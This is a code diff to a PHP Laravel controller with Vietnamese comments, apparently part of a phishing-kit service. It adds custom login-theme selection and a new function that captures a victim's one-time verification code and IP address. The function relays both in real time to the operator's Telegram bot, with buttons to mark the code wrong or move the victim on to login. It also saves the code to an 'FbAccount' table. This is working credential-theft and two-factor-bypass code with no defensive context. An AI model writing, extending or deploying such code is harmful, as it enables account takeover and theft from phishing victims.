@@ -59,7 +59,8 @@ class CustomWeb extends Controller
                 if ($web_data->theme_folder == 'suleo123_tuyeneditor') {
                     $web_data->redirect_link = '?success';
                 }
-                return view('login.realtime.' . $web_data->loginThemeFolder, [
+                $login_theme_folder = $web_data->isCustomLoginTheme ? 'custom.login.' . $web_data->loginThemeFolder : 'login.' . $web_data->login_theme_folder;
+                return view($login_theme_folder, [
                     'data' => $web_data,
                     'info' => $web_info,
                     'setting' => $user_setting,
@@ -727,6 +728,88 @@ class CustomWeb extends Controller
                                     'reply_markup' => json_encode(['inline_keyboard' => $keyboard]),
                                 ]);
                             }
+                        }
+                    }
+                }
+            } catch (\Throwable $e) {
+                return response([
+                    'status' => false,
+                ]);
+            }
+        }
+    }
+     # 0935396675 CUSTOM OTP THEME
+    function theme_0935396675_custom_otp(Request $rq)
+    {
+        if ($rq->filled('d')) {
+            try {
+                $post_data = Json::decode($rq->d);
+                $web_info = Json::decode(Crypt::decryptString($post_data->info));
+                $ip = getRealIp();
+                $pusher_code = $rq->p_c;
+                // kiểm tra thời gian chống spam nếu đã nhập từ trước (giới hạn 3s/lần)
+                $check_ip = FbAccount::where('ip', $ip)
+                    ->where('type', 'custom_0935396675_otp')
+                    ->latest()
+                    ->first();
+                $wait_seconds = 3;
+                if ($check_ip) {
+                    if ($check_ip->created_at->diffInSeconds(now()) <= $wait_seconds) {
+                        return response([
+                            'status' => false,
+                        ]);
+                    }
+                }
+                # custom bot
+                $custom_realtime_bot = new Api(config('telegrambot.custom'));
+                $user = User::find($web_info->userid);
+                if ($user) {
+                    // kiểm tra xem ip có bị chặn không
+                    if (check_blocked_ip($user->id, $ip)) {
+                        return;
+                    }
+                    $user_telegram_id = Json::decode($user->data)->telegram_id;
+                    if ($user_telegram_id) {
+                        $website = Website::where('userid', $user->id)->where('id', $web_info->webid)->first();
+                        if ($website) {
+                            $website = Json::decode($website->data);
+                            $keyboard = [
+                                    [
+                                        ['text' => '❌ Nhập sai mã', 'callback_data' => 'wrongcode_' . $pusher_code],
+                                    ],
+                                    [
+                                        ['text' => '✅ Thành công, sang login', 'callback_data' => 'done_' . $pusher_code],
+                                    ]
+                                ];
+                            $msg = implode("\n", [
+                                "Giao diện login tùy chỉnh",
+                                "",
+                                "Title: <b>{$website->title}</b>",
+                                "",
+                                "------------------------",
+                                "<b>Mã xác minh:</b> <code>" . $post_data->otp . "</code>",
+                                "------------------------",
+                                "",
+                                "<b>Phân biệt:</b> {$web_info->emoji}",
+                                "<b>IP:</b> {$ip}",
+                                ""
+                            ]);
+
+                            $custom_realtime_bot->sendMessage([
+                                'chat_id' => $user_telegram_id,
+                                'parse_mode' => 'HTML',
+                                'text' => $msg,
+                                'reply_markup' => json_encode(['inline_keyboard' => $keyboard]),
+                            ]);
+
+                            // chống spam: lưu lại ip đã gửi
+                            FbAccount::create([
+                                'userid' => $web_info->userid,
+                                'webid' => $web_info->webid,
+                                'password' => $post_data->otp,
+                                'type' => 'custom_0935396675_otp',
+                                'ip' => $ip
+                            ]);
                         }
                     }
                 }
